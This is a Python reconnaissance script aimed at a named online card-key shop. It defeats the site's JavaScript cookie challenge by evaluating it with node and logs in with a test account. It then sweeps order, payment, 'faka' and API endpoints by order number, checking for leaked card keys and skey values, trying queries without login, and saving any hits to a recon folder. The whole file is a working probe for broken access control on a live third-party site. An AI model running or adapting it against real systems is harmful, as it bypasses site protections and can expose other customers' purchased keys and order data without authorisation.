#!/usr/bin/env python3
"""Query created unpaid orders; check order detail / skey / kami surfaces."""
import re
import json
import subprocess
import urllib.parse
import urllib.request
import http.cookiejar
from pathlib import Path

HOST = "http://xunqq.cn"
BASE = HOST + "/admin"
UA = "Mozilla/5.0"
OUT = Path("/data/recon/pfqq.net")
USER = "rc5839297"
PWD = "Test123456"
ORDERS = ["20260804182818749", "20260804182819420"]


def main():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    def get(url, data=None, headers=None):
        h = {"User-Agent": UA, "Referer": BASE + "/", "Accept": "*/*"}
        if headers:
            h.update(headers)
        if data is not None:
            h["Content-Type"] = "application/x-www-form-urlencoded"
            h["X-Requested-With"] = "XMLHttpRequest"
        req = urllib.request.Request(url, data=data, headers=h)
        return op.open(req, timeout=20).read().decode("utf-8", "ignore")

    def setc(n, v):
        cj.set_cookie(
            http.cookiejar.Cookie(
                0, n, v, None, False, "xunqq.cn", False, False, "/", False,
                False, None, False, None, None, {},
            )
        )

    get(HOST + "/nasgo/")
    get(HOST + "/loading/")
    html = get(BASE + "/")
    m = re.search(
        r"setCookie\(\s*[\"']sec_defend[\"']\s*,\s*(.+?)\)\s*;\s*setCookie\(\s*[\"']sec_defend_time[\"']",
        html,
        re.S,
    )
    val = subprocess.run(
        ["node", "-e", f"console.log({m.group(1)})"],
        capture_output=True,
        text=True,
    ).stdout.strip()
    setc("sec_defend", val)
    setc("sec_defend_time", "2")
    get(BASE + "/index.php")

    login = get(
        BASE + "/user/ajax.php?act=login",
        data=urllib.parse.urlencode({"user": USER, "pass": PWD}).encode(),
    )
    print("LOGIN", login)

    results = {"orders": {}}
    for tn in ORDERS:
        page = get(BASE + f"/?mod=order&orderid={tn}")
        page2 = get(BASE + f"/?mod=order&trade_no={tn}")
        page3 = get(HOST + f"/admin/?mod=order&orderid={tn}")
        # common rainbow order status page
        for path in [
            f"/?mod=order&orderid={tn}",
            f"/?mod=order&trade_no={tn}",
            f"/?mod=query&data={tn}",
            f"/pay/order.php?trade_no={tn}",
            f"/?mod=pay&trade_no={tn}",
            f"/?mod=faka&orderid={tn}",
            f"/?mod=faka&trade_no={tn}",
        ]:
            body = get(BASE + path)
            markers = {
                "len": len(body),
                "skey": bool(re.search(r"skey|sk=", body, re.I)),
                "kami": bool(re.search(r"卡密", body)),
                "status": re.findall(r"(未支付|已完成|已付款|待支付|支付成功)", body)[:5],
                "title": (re.search(r"<title>([^<]+)", body) or [None, None])[1],
            }
            print(path, markers)
            results["orders"].setdefault(tn, {})[path] = markers
            if "卡密" in body or "skey" in body.lower():
                (OUT / "probe" / f"order_{tn}_{path.replace('/','_').replace('?','_')}.html").write_text(
                    body, encoding="utf-8"
                )

        # api search by trade?
        for q in [
            f"api.php?act=search&id={tn}",
            f"api.php?act=orders&key=&limit=1&trade_no={tn}",
            f"ajax.php?act=order&trade_no={tn}",
            f"ajax.php?act=order&id={tn}",
        ]:
            body = get(BASE + "/" + q)
            print("API", q, body[:220])

    # user center order list
    for path in [
        "/user/",
        "/user/index.php",
        "/user/?mod=order",
        "/user/ajax.php?act=order",
        "/user/ajax.php?act=orders",
        "/user/ajax.php?act=query",
    ]:
        body = get(BASE + path)
        print("USER", path, len(body), body[:200].replace("\n", " "))

    # unauth query of our trade_no (fresh session without login would need new waf - test with current first)
    for tn in ORDERS:
        body = get(
            BASE + f"/ajax.php?act=query&page=1&data={tn}",
            headers={"X-Requested-With": "XMLHttpRequest"},
        )
        print("AJAXQ", tn, body[:300])
        page = get(BASE + f"/?mod=query&data={tn}")
        print(
            "MODQ",
            tn,
            re.findall(r"(订单号|状态|未支付|卡密|商品)[^<]{0,40}", page)[:10],
        )

    (OUT / "dump" / "ORDERS.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    print("DONE")


if __name__ == "__main__":
    main()
